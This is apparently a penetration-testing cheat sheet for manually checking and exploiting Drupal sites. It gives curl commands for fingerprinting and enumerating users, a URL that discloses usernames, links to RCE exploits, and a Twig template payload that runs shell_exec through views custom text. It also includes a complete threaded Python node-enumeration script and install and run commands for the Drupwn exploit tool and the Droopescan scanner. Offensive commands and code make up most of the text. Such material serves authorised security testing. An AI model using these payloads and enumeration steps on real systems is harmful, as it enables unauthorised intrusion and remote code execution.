# Manual Drupal Security Checks and Exploits

## Basic Information Gathering

### Check Meta Information
Identify if a website is running Drupal:
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```

### Enumerate Users
Check if a user exists:
- A `403 Forbidden` response indicates the user exists.
- A `404 Not Found` response indicates the user does not exist.
```bash
curl https://www.drupal.org/user/X
```

Get the username associated with a user ID:
```bash
curl https://www.drupal.org/reset/user/X/1/1
```

## Exploits

### Drupal < 8.7.x Authenticated RCE Module Upload
- **Reference:** [Drupal Issue 3093274](https://www.drupal.org/project/drupal/issues/3093274)
- **Exploit File:** [drupal_rce.tar.gz](https://www.drupal.org/files/issues/2019-11-08/drupal_rce.tar_.gz)

### Drupal < 9.1.x Authenticated RCE via Twig Templates
- **Reference:** [Drupal Issue 2860607](https://www.drupal.org/project/drupal/issues/2860607)
- **Exploit Steps:**
  - "Administer views" -> new View of User Fields -> Add a "Custom text":
```java
"{{ {"#lazy_builder": ["shell_exec", ["touch /tmp/hellofromviews"]]} }}"
```

### Drupal 8 Exploit
- **Reference:** [Exploit-DB 46459](https://www.exploit-db.com/exploits/46459)

### Node Enumeration
If `/node/$NUMBER` is found, it could indicate developer or test pages.

### Username Disclosure
Older Drupal versions might disclose usernames:
```bash
?q=admin/views/ajax/autocomplete/user/a
```

## Tools for Drupal Enumeration and Exploitation
### Enumerate nodes - Get URLs
https://raw.githubusercontent.com/D0ntTrustMe/drupal-enum/refs/heads/main/DRUPAL_get_urls.py

```python
#!/usr/bin/python3
# coding:utf8

import argparse
import requests
import urllib3  
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

def fetch_url(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36"
    }
    try:
        response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
        if response.status_code == 301:
             return response.headers.get("Location")
        else:
             return None
    except requests.exceptions.ConnectionError as e:
            print(f"Error: {e}")

def main(url_target):
    DRUPAL_URL = f"{url_target}/node/"
    ids = range(1, 1001)
    urls = [f"{DRUPAL_URL}{id}" for id in ids]
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_url = {executor.submit(fetch_url, url): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                location = future.result()
                if location is not None:
                     print(f"{location}")
            except Exception as exc:
                 print(f"Error: {exc}")

def parseArgs():
    parser = argparse.ArgumentParser(description="Drupal - Get All URLs")
    parser.add_argument("-u", "--url", required=True, help="Drupal URL")
    return parser.parse_args()

if __name__ == '__main__':
    options = parseArgs()
    main(options.url)
```
#### Drupwn
Drupwn is a tool for enumerating and exploiting Drupal installations.

#### Installation
```bash
git clone https://github.com/immunIT/drupwn.git
cd drupwn
pip3 install -r requirements.txt
```

#### Enumeration
```bash
drupwn --mode enum --target $url
```

#### Exploitation
```bash
drupwn --mode exploit --target $url
```

### Droopescan
>Droopescan is a plugin-based scanner that helps security researchers identify issues with several CMSs, including Drupal.

#### Installation
```bash
apt-get install python-pip
pip install droopescan
```

#### Scanning
```bash
droopescan scan drupal -u example.org
```
